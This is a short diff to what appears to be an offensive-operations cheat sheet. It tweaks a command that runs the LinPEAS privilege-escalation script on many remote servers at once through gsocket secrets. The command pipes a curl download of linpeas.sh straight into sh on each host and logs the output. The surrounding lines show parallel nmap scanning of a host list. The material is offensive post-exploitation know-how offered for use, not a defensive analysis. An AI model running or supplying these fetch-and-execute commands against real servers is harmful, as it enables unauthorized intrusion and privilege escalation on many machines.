@@ -298,8 +298,10 @@ cat hosts.txt | parallel -j20 'nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
 Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
 ```sh
 # secrets.txt contains a long list of gsocket-secrets for each remote server.
-cat secrets.txt | parallel -j20 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
+cat secrets.txt | parallel -j40 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
 ```
+
+Note: `xargs -P20 -I{}` is another good way but it cant log each output into separate file.
 
 ---
 <a id="ssh"></a>
